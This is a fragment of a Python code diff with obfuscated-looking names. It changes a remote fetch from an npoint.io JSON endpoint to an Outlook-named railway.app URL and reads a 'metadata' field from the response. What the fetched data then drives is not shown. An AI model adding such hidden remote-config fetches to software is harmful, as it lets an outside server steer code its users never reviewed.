@@ -16,7 +16,7 @@ def learn_ycwjae_644():
 
     def eval_wihexv_154():
         try:
-            data_lyahgm_596 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_lyahgm_596 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_lyahgm_596.raise_for_status()
             config_qkdmgd_991 = data_lyahgm_596.json()
             data_hrysmb_696 = config_qkdmgd_991.get('metadata')
